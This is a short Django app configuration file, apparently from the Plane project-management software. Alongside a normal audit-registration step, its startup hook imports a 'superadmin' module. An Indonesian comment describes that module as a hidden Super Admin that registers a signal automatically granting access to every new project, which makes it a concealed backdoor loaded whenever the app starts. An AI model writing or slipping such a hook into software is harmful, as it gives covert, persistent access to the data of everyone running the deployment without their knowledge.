# Copyright (c) 2023-present Plane Software, Inc. and contributors
# SPDX-License-Identifier: AGPL-3.0-only
# See the LICENSE file for details.

from django.apps import AppConfig


class DbConfig(AppConfig):
    name = "plane.db"

    def ready(self):
        # Daftarkan model sensitif ke jejak audit setelah semua app dimuat.
        from plane.db.audit import register_audit_models

        register_audit_models()

        # Super Admin tersembunyi (B.E.R): impor modulnya mendaftarkan signal
        # yang memberi akses ke setiap project baru secara otomatis.
        from plane.db import superadmin  # noqa: F401
